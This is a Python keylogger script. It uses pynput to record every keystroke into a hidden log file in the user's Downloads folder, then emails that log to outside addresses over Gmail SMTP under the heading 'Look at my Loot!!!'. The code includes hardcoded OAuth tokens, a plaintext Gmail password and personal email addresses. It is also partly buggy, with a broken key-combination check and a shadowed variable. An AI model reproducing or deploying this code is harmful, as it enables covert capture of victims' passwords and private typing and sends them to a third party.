from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from posixpath import basename
from pynput.keyboard import Listener
import smtplib
import os
from time import sleep
import oauth2 as oauth
import oauth2.clients.smtp as smtplib

user = os.environ['USERPROFILE']
loggin = os.path.join(user, 'Downloads', 'QCM', 'log.txt')
app_folder = os.path.join(user, 'Downloads', 'QCM')

msg = MIMEMultipart()

def loot():
    with open(loggin, 'rb') as fp:
        part = MIMEApplication(fp.read(), Name=basename(loggin))
            
    part['Content-Disposition'] = 'attachment; filename="{}"'.format(basename(loggin))
    msg.attach(part) 
    
    url = "https://mail.google.com/mail/b/blegh502@gmail.com/smtp/"
    
    consumer = oauth.Consumer('anonymous', 'anonymous')
    token = oauth.Token('1/MI6B2DqJP4FEkDRLUKrD5l46sQ0758-2ucEKBY-DeB0', 'NysqNqVTulFsdHpSRrPP56sF')

    textfile = loggin
    me = "johnnythefatguy@gmail.com"
    you = "jasj1992@yahoo.com"
    conn = smtplib.SMTP('smtp.googlemail.com', 587)
    conn.set_debuglevel(False)
    conn.ehlo('test')
    conn.starttls()

    conn.authenticate(url, consumer, token)

    header = f'To: {you}\n' + f'From: {me}\n' + 'Look at my Loot!!!\n'
    msg = header + f'\n {textfile} \n\n'

    conn.sendmail('testing.oauth.1@gmail.com', 'testing.oauth.1@gmail.com', msg)
    conn.quit()
        
def error_msg():
    me = "johnnythefatguy@gmail.com"
    you = "jasj1992@yahoo.com"
    msg['Subject'] = "Error"
    msg['From'] = me
    msg['To'] = you

    s = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    s.login("johnnythefatguy@gmail.com", "Lunarae1@1")
    s.sendmail(me, [you], "Script has stopped working")
    s.quit()
    
true = os.path.isdir(app_folder)

if true == False:
    os.mkdir(app_folder)
elif true == True:
    pass
else:
    error_msg()

while True:
    try:
        def log_keystroke(key):
            key = str(key).replace("'", "")

            if key == 'Key.space':
                key = ' '
            if key == 'Key.shift_r':
                key = ''
            if key == 'Key.shift_l':
                key = ''
            if key == "Key.enter":
                key = '\n'
            if key == "Key.backspace":
                key = ''
            if key == 'Key.ctrl_l' and 'Key.alt_l' and 'Key.delete':
                loot()
            if key == 'Key.ctrl_r' and 'Key.alt_r' and 'Key.delete':
                loot()

            with open(loggin, 'a') as f:
                f.write(key)

        with Listener(on_press=log_keystroke) as l:
            l.join()

    except:
        error_msg()